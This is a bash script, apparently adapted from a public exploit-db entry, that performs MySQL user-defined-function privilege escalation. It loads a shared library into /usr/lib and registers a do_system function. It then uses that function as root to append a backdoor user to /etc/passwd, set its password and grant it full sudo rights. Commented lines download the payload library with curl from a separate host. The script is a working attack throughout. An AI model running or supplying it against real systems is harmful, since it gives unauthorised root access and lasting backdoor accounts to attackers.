#!/bin/bash
#
#code taken from https://www.exploit-db.com/exploits/1518/
#
# usage: ./sql_escalator.sh user password
#
USER_="$1"
PASS_="$2"

cd /tmp
#curl -O 192.168.14.160/pwn.o
#curl -O 192.168.14.160/pwn.so
#chmod +x /tmp/pwn*

# We want to execute the following commands:
# * mysql> create table foo(line blob);
# * mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
# * mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
# * mysql> create function do_system returns integer soname 'raptor_udf2.so';
# * mysql> select * from mysql.func;
# * mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');

echo ""
#this sets up our dumpfile and function to perform our commands
echo "creating foo table"
mysql -D mysql -u "$USER_" -p"$PASS_" -e "create table foo(line blob);"
echo "Result $?"
echo ""
echo "inserting foo"
mysql -D mysql -u "$USER_" -p"$PASS_" -e "insert into foo values(load_file('/tmp/pwn.so'));"
echo "Result $?"
echo ""
echo "selecting foo"
mysql -D mysql -u "$USER_" -p"$PASS_" -e "select * from foo into dumpfile '/usr/lib/pwn.so';"
echo "Result $?"
echo ""
echo "creating foo func"
mysql -D mysql -u "$USER_" -p"$PASS_" -e "create function do_system returns integer soname 'pwn.so';"
echo "Result $?"
echo ""

#now we add a user
echo "adding user"
#mysql -D mysql -u $1 -p $2 -e "select do_system('useradd -d /home/acidburn -g acidburn -m -p $(echo "password" | openssl passwd -1 -stdin) acidburn');"
mysql -D mysql -u "$USER_" -p"$PASS_" -e "select do_system('echo \"groot:x:1042:1042:i am groot,,,:/root:/bin/bash\" >> /etc/passwd');"
echo "Result $?"
echo ""


#now add to sudoers
#mysql -D mysql -u $1 -p $2 -e "select do_system('echo \"acidburn ALL=(ALL) ALL\" >> /etc/sudoers');"
echo "changing groot password"
mysql -D mysql -u "$USER_" -p"$PASS_" -e "select do_system('echo i_am_groot | passwd --stdin groot');"
echo "Result $?"
echo ""
echo "adding to sudoers"
mysql -D mysql -u "$USER_" -p"$PASS_" -e "select do_system('echo \"groot ALL=(ALL) ALL\" >> /etc/sudoers');"
echo "Result $?"
echo ""
